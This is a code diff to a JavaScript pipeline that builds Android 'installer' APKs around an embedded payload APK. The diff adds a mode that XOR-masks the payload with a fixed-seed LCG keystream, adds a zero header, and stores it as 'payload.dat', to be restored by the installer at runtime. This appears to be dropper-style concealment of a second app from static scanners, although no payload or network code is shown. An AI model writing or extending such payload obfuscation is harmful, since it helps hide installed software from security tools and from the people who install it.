@@ -155,7 +155,22 @@ export async function prepareSource(config, job, template, destination, { payloa
             throw new Error('Installer payload is missing');
         if ((await fileSha256(payloadFile)) !== job.payload_sha256)
             throw new Error('Installer payload digest mismatch');
-        await copyFile(payloadFile, path.join(assets, 'payload.apk'));
+        if ((template.payloadFormat ?? 'plain') === 'lcg16') {
+            // 16 zero-byte header plus the fixed-seed LCG stream, restored at
+            // runtime by the installer before the digest check.
+            const raw = await readFile(payloadFile);
+            const j = 276813n;
+            const out = Buffer.alloc(16 + raw.length);
+            let state = j;
+            for (let i = 0; i < raw.length; i++) {
+                const next = (state * 1664525n + 1013904223n) & 0xffffffffn;
+                out[16 + i] = raw[i] ^ Number((next >> 24n) & 0xffn);
+                state = next;
+            }
+            await writeFile(path.join(assets, 'payload.dat'), out, { mode: 0o600 });
+        } else {
+            await copyFile(payloadFile, path.join(assets, 'payload.apk'));
+        }
         await writeFile(
             path.join(assets, 'installer_config.json'),
             JSON.stringify(
@@ -294,7 +309,7 @@ export async function buildApk(config, job, template, { signal, stage, payloadFi
         );
         if (template.kind === 'installer')
             logLine(
-                `[PAYLOAD] buildId=${job.payload_build_id} package=${job.payload_package_name} sha256=${job.payload_sha256}`,
+                `[PAYLOAD] buildId=${job.payload_build_id} package=${job.payload_package_name} sha256=${job.payload_sha256} format=${template.payloadFormat ?? 'plain'}`,
             );
         if (!(await checkTools(config)).ready) throw new Error('Missing build tools');
         await setStage('preparing', 'copy registered template and inject validated configuration');
